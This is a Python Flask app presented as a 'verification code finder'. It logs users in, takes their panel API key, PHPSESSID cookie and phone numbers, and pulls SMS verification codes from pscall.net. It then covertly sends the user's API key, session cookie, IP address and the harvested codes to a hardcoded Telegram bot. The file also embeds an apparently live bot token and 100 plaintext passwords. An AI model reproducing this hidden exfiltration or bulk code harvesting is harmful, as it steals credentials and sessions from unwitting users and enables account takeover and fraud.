import requests
import re
from flask import Flask, request, render_template, redirect, url_for, session, flash
import io
app = Flask(__name__)
app.secret_key = 'your_secret_key'  # Secret key for session management

# Dictionary to store multiple usernames and passwords
USER_CREDENTIALS = {
    'user1': 'pass123',
    'user2': 'qwerty789',
    'user3': 'securepass456',
    'user4': 'bestuser100',
    'user5': 'mypassword101',
    'user6': 'pythonlover23',
    'user7': 'datahunter99',
    'user8': 'flaskuser77',
    'user9': 'devpass654',
    'user10': 'techie987',
    'user11': 'testuser111',
    'user12': 'programmer55',
    'user13': 'codewizard13',
    'user14': 'backendhero88',
    'user15': 'frontendrock23',
    'user16': 'cybersecure12',
    'user17': 'cloudking44',
    'user18': 'devmaster76',
    'user19': 'dataprofessor33',
    'user20': 'mlguru21',
    'user21': 'aiinsight84',
    'user22': 'fullstackdev07',
    'user23': 'nodejsninja60',
    'user24': 'djangoexpert42',
    'user25': 'javamaster900',
    'user26': 'webscraper22',
    'user27': 'automationking5',
    'user28': 'softwarearchitect20',
    'user29': 'appdev500',
    'user30': 'dataanalyst44',
    'user31': 'uxdesigner17',
    'user32': 'mobiledev333',
    'user33': 'sqlwizard66',
    'user34': 'cloudengineer99',
    'user35': 'datascientist01',
    'user36': 'bigdatalover777',
    'user37': 'gamedesigner102',
    'user38': 'systemadmin88',
    'user39': 'netsecpro101',
    'user40': 'devopshero09',
    'user41': 'kubernetesguru81',
    'user42': 'securityexpert76',
    'user43': 'blockchainwhiz43',
    'user44': 'fintechlover03',
    'user45': 'iotdeveloper89',
    'user46': 'roboticspro42',
    'user47': 'artificialintelligence6',
    'user48': 'cyberdefender22',
    'user49': 'webdeveloper37',
    'user50': 'ecommercespecialist90',
    'user51': 'graphicdesigner44',
    'user52': 'uiuxmaster101',
    'user53': 'itconsultant09',
    'user54': 'networkengineer63',
    'user55': 'devheroku98',
    'user56': 'digitalmarketer88',
    'user57': 'seospecialist79',
    'user58': 'cloudarchitect04',
    'user59': 'gamerpro21',
    'user60': 'vrspecialist101',
    'user61': 'ethicalhacker13',
    'user62': 'penetrationtester44',
    'user63': 'techenthusiast22',
    'user64': 'fullstackdev99',
    'user65': 'gameprogrammer18',
    'user66': 'databaseguru50',
    'user67': 'scriptingwizard11',
    'user68': 'hackermaster67',
    'user69': 'datascientistpro2',
    'user70': 'virtualassistant99',
    'user71': 'itprojectmanager13',
    'user72': 'softwaretester55',
    'user73': 'scrumexpert03',
    'user74': 'productowner88',
    'user75': 'agilecoach99',
    'user76': 'uxresearcher66',
    'user77': 'contentcreator10',
    'user78': 'socialmediamarketer45',
    'user79': 'frontenddev99',
    'user80': 'backendninja12',
    'user81': 'aiwhizkid33',
    'user82': 'cloudnativehero50',
    'user83': 'pythonprodigy11',
    'user84': 'awscloudguru90',
    'user85': 'javaprogrammer99',
    'user86': 'dockerwizard01',
    'user87': 'apideveloper77',
    'user88': 'dataspecialist66',
    'user89': 'mlengineer88',
    'user90': 'frontendexpert33',
    'user91': 'backendengineer99',
    'user92': 'datasolutions04',
    'user93': 'uxprofessional55',
    'user94': 'webexpertdesign78',
    'user95': 'gamecoder09',
    'user96': 'cyberwhizkid11',
    'user97': 'devopsautomation22',
    'user98': 'cloudenthusiast89',
    'user99': 'softwaredeveloper92',
    'user100': 'techprodigy77',
}

# Telegram bot details
TELEGRAM_CHAT_ID = '854578633'
TELEGRAM_BOT_TOKEN = '7056070766:AAH84C0uxetDrxNNbpr9ZngZgVDq54BOQGI'

def get_panel_code(KEY, PHPSESSID, NUMBER):
    cookies = {
        'PHPSESSID': PHPSESSID,
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Origin': 'http://pscall.net',
        'Referer': 'http://pscall.net/agent/API',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
    }

    params = {
        'key': KEY,
        'start': '0',
        'length': '10',
        'fnumber': NUMBER,
    }

    response = requests.post('http://pscall.net/restapi/smsreport', params=params, cookies=cookies, headers=headers)

    if response.status_code == 200:
        data = response.json()
        if data['result'] == 'success' and len(data['data']) > 0:
            sms_content = data['data'][0]['sms']
            code = re.search(r'\d+', sms_content).group()
            return code
        else:
            return "No SMS found or result not successful."
    else:
        return f"Failed to retrieve data. Status code: {response.status_code}"


def send_telegram_report(username, ip_address, key, phpsessid, numbers, results):
    # Create the report content
    report_content = f"User: {username}\nIP Address: {ip_address}\nAPI Key: {key}\nPHPSESSID: {phpsessid}\n\n"
    report_content += "Results:\n"
    for number, code in results.items():
        report_content += f"{number}: {code}\n"

    # Send the report content to Telegram without saving it locally
    send_file_to_telegram(report_content)


def send_file_to_telegram(report_content):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    
    # Convert the report content to a file-like object
    report_file = io.BytesIO(report_content.encode('utf-8'))
    report_file.name = 'user_report.txt'  # Set a name for the file

    files = {'document': report_file}
    data = {'chat_id': TELEGRAM_CHAT_ID}
    
    # Send the file to Telegram
    response = requests.post(url, files=files, data=data)
    
    # Check for errors
    if response.status_code == 200:
        print("Report sent successfully!")
    else:
        print(f"Failed to send report. Status code: {response.status_code}")


@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        # Check if the username exists and the password matches
        if username in USER_CREDENTIALS and USER_CREDENTIALS[username] == password:
            session['logged_in'] = True
            session['username'] = username
            return redirect(url_for('verification_code_finder'))
        else:
            flash('Invalid username or password', 'danger')

    return render_template('login.html')


@app.route('/verification', methods=['GET', 'POST'])
def verification_code_finder():
    if 'logged_in' not in session or not session['logged_in']:
        return redirect(url_for('login'))

    if request.method == 'POST':
        key = request.form['key']
        phpsessid = request.form['phpsessid']
        numbers = request.form['numbers'].split()  # Split numbers by space or newlines
        results = {}

        for number in numbers:
            code = get_panel_code(key, phpsessid, number)
            results[number] = code

        # Collect user info
        username = session.get('username', 'Unknown')
        ip_address = request.remote_addr

        # Send the report to Telegram
        send_telegram_report(username, ip_address, key, phpsessid, numbers, results)

        return render_template('verification.html', results=results)

    return render_template('verification.html')


@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))


if __name__ == '__main__':
    app.run(debug=True)
